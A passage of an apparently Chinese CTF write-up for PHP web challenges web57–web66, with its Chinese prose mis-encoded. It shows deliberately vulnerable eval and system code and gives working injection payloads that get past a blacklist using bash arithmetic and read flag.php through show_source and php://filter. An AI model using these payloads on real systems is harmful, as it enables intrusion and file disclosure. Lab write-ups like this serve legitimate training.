</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">//flag in 36.php
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|</span><span class="se">\x0a</span><span class="s2">|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat &#34;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤æ¡ä»¶å¢åŠ </p>
<blockquote>
<p>;|[a-z]|[0-9]|`||#|'|&quot;|`|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|=|[/</p></blockquote>
<p>è¿™é“é¢˜æŠŠ<code>?</code>è¿‡æ»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p>
<pre tabindex="0"><code>system(&#34;cat &#34;.$c.&#34;.php&#34;);
</code></pre><p>è¿™é¢˜ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„getå‚æ•°è¿›è¡Œæ‹¼æ¥åå†æ‰§è¡Œ</p>
<p>é¢˜ç›®é‡Œæœ‰ä¸ªæš—ç¤º</p>
<pre tabindex="0"><code>//flag in 36.php
</code></pre><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ç”¨ç¬¦å·æ„é€ å‡º36</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨linuxçš„$(())æ„é€ å‡º36</p>
<p>åœ¨linuxé‡Œé¢$(())=0ï¼Œ$((~ $(()) ))=-1</p>
<p>å…¶ä¸­~ç¬¦å·è¡¨ç¤ºå–åï¼Œè¿™é‡Œ0çš„å–åç­‰äºï¼1</p>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å…ˆå°†36ä¸ª-1åŠ èµ·æ¥å†å–åå¾—åˆ°æˆ‘ä»¬éœ€è¦çš„36</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
</code></pre><p><img alt="image-20241128205205756" loading="lazy" src="assets/image-20241128205205756.png"></p>
<p>ä»è€Œå¾—åˆ°flag</p>
<h4 id="web58">web58<a hidden class="anchor" aria-hidden="true" href="#web58">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>c=highlight_file(&#34;flag.php&#34;);
c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php //æ–‡ä»¶åŒ…å«ï¼Œå¾—åˆ°çš„å›æ˜¾éœ€è¦è¿›è¡Œbase64è§£ç 
c=show_source(&#39;flag.php&#39;);
</code></pre><h4 id="web59">web59<a hidden class="anchor" aria-hidden="true" href="#web59">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è§£æ³•ä¸ä¸Šé¢˜ä¸€è‡´ï¼Œä¸å†èµ˜è¿°</p>
<p>ï¼ˆæ²¡ææ‡‚ä¸¤é¢˜æœ‰ä»€ä¹ˆåŒºåˆ«ï¼‰</p>
<h4 id="web60">web60<a hidden class="anchor" aria-hidden="true" href="#web60">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è§£æ³•ä¾æ—§ä¸web58ä¸€è‡´</p>
<p>å¯èƒ½æˆ‘å¤ªèœäº†çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆåŒºåˆ«</p>
<h4 id="web61">web61<a hidden class="anchor" aria-hidden="true" href="#web61">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§web58</p>
<h4 id="web62">web62<a hidden class="anchor" aria-hidden="true" href="#web62">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§&hellip;</p>
<h4 id="web62-1">web62<a hidden class="anchor" aria-hidden="true" href="#web62-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§&hellip;&hellip;</p>
<h4 id="web63">web63<a hidden class="anchor" aria-hidden="true" href="#web63">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§&hellip;&hellip;</p>
<h4 id="web64">web64<a hidden class="anchor" aria-hidden="true" href="#web64">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å˜¶ï¼Œæ€ä¹ˆè¿˜æ˜¯é‚£æ ·&hellip;</p>
<h4 id="web65">web65<a hidden class="anchor" aria-hidden="true" href="#web65">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>åŒä¸Š&hellip;</p>
<h4 id="web66">web66<a hidden class="anchor" aria-hidden="true" href="#web66">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
